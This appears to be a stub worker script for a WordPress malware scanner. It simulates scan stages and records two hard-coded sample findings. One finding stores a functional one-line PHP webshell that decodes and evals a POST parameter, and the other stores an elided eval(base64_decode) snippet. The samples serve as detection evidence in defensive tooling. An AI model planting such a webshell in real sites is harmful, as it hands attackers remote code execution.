# backend/scripts/worker.py
import time
from core.storage.dao import update_scan, add_finding

def _check_sftp(ticket:dict):
    # Platzhalter: hier später echten SFTP-Handshake machen
    sftp = ticket.get("sftp") or {}
    if not sftp.get("host") or not sftp.get("user"):
        raise RuntimeError("missing_sftp_credentials")
    return True

def run_scan(scan_id:int, ticket:dict):
    try:
        update_scan(scan_id, state="running", started=True, pct=1, stage="baseline")
        # --- Ticket-/SFTP-Check ---
        _check_sftp(ticket)
        # baseline
        time.sleep(1.2); update_scan(scan_id, pct=20)
        # triage
        update_scan(scan_id, stage="triage"); time.sleep(1.2); update_scan(scan_id, pct=45)
        add_finding(scan_id, "wp-includes/random.php", "core_tamper", "high", 95,
                    {"signals":["hash_mismatch","unexpected_core_file"]},
                    "<?php /*…*/ eval(base64_decode('…'));", "Quarantäne & Core-Datei ersetzen")
        # deep
        update_scan(scan_id, stage="deep"); time.sleep(1.6); update_scan(scan_id, pct=75)
        add_finding(scan_id, "wp-content/uploads/.cache/uploader.php", "webshell", "high", 120,
                    {"signals":["eval+base64","new_php_in_uploads"]},
                    "<?php $x=base64_decode($_POST['p']); eval($x);", "Quarantäne & Uploads härten")
        # report
        update_scan(scan_id, stage="report"); time.sleep(0.8)
        update_scan(scan_id, pct=100, state="succeeded", summary="Stub-Scan abgeschlossen", finished=True)
    except Exception as e:
        update_scan(scan_id, state="failed", summary=f"{type(e).__name__}: {e}", finished=True)
